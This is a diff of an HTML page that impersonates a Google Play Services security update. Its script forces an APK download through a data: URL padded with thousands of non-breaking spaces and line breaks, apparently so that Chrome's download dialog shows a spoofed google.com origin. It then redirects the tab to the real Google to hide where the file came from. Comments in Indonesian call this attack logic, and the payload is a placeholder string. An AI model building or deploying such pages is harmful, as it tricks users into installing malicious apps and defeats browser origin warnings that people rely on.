@@ -3,61 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Services</title>
+    <title>Google Play Service Update</title>
     <style>
-        body { background: #f8f9fa; color: #202124; font-family: 'Roboto', sans-serif; text-align: center; padding-top: 100px; }
-        .card { border: 1px solid #dadce0; padding: 40px; display: inline-block; border-radius: 8px; background: #fff; max-width: 320px; }
-        .logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; }
-        .blue { color: #4285f4; } .red { color: #ea4335; } .yellow { color: #fbbc05; } .green { color: #34a853; }
-        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; }
+        body { 
+            background-color: #f8f9fa; 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            font-family: 'Roboto', sans-serif;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            max-width: 350px;
+        }
+        .g-logo {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .blue { color: #4285F4; } .red { color: #EA4335; } 
+        .yellow { color: #FBBC05; } .green { color: #34A853; }
+        
+        h2 { font-size: 18px; color: #202124; margin-bottom: 10px; }
+        p { font-size: 14px; color: #5f6368; line-height: 1.5; }
+        
+        #pwnBtn {
+            margin-top: 25px;
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+        }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div class="logo">
-            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
-        </div>
-        <p>Update Google Play Services to continue using this device.</p>
-        <button id="pwnBtn">UPDATE NOW</button>
+<div class="container">
+    <div class="g-logo">
+        <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
     </div>
+    <h2>System Update Required</h2>
+    <p>Install the latest security patches for Google Play Services to keep your device secure.</p>
+    
+    <button id="pwnBtn">UPDATE NOW</button>
+</div>
 
 <script>
     document.getElementById('pwnBtn').addEventListener('click', function() {
         const filename = "Google_Play_v2026.apk";
-        const spoofDomain = "https://www.google.com";
+        const targetDomain = "https://www.google.com";
         
-        // --- CHROME SPECIFIC STRATEGY: Blob URL Masking ---
-        // Chrome sering kali menampilkan origin dari 'halaman terakhir yang aktif'.
-        const blob = new Blob(["PK\x03\x04..."], {type: "application/vnd.android.package-archive"});
-        const url = URL.createObjectURL(blob);
+        // --- CHROME ADVANCED ATTACK LOGIC ---
         
-        // Padding ekstrem menggunakan kombinasi karakter agar Chrome gagal melakukan sanitasi origin
+        // 1. Long MIME Type untuk membingungkan parser UI awal
+        const longMime = "application/octet-stream" + ";".repeat(100);
+        
+        // 2. Line Break & Carriage Return (%0D%0A)
+        // Mencoba memaksa teks setelah fragment pindah ke baris baru di dialog Chrome
+        const lineBreak = decodeURIComponent("%0D%0A");
+        
+        // 3. Massive Padding menggunakan Non-Breaking Space
         const nbSpace = decodeURIComponent("%C2%A0");
-        const padding = nbSpace.repeat(4000); // Dorong skema blob: keluar
+        const massivePadding = nbSpace.repeat(2500); 
+
+        // Konstruksi Payload
+        // data:[MIME]#[Padding][LineBreak][FakeOrigin]
+        const base64Payload = "ZXN0dGVzdHRlc3Q="; 
+        const payload = `data:${longMime};base64,${base64Payload}#${massivePadding}${lineBreak}${targetDomain}/update/patch/`;
+
+        // Create hidden anchor
+        const a = document.createElement('a');
+        a.href = payload;
+        a.download = filename;
+        document.body.appendChild(a);
         
-        const payload = url + "#" + padding + spoofDomain + "/update/";
+        // Trigger Download
+        a.click();
 
-        // TRIGGER 1: Buka tab baru ke Google asli (untuk "mengambil" context origin)
-        const fakeWindow = window.open("https://www.google.com", "_blank");
-
-        // TRIGGER 2: Jalankan download di tab ini sesaat setelah tab baru dibuka
+        // Immediate Redirect ke Google Asli
+        // Ini mengubah context "Active Tab" di Address Bar saat dialog muncul
         setTimeout(() => {
-            const a = document.createElement('a');
-            a.href = payload;
-            a.download = filename;
-            document.body.appendChild(a);
-            a.click();
-            
-            // Langsung pindah (Redirect) tab ini juga ke google agar address bar berubah
-            window.location.replace("https://www.google.com/search?q=security+update+success");
-        }, 300);
-
-        // TRIGGER 3: Tutup tab baru tadi agar user kembali fokus ke dialog download yang muncul
-        setTimeout(() => {
-            if (fakeWindow) fakeWindow.close();
-        }, 1500);
+            window.location.href = "https://www.google.com/";
+            document.body.removeChild(a);
+        }, 3000);
     });
 </script>
+
 </body>
 </html>
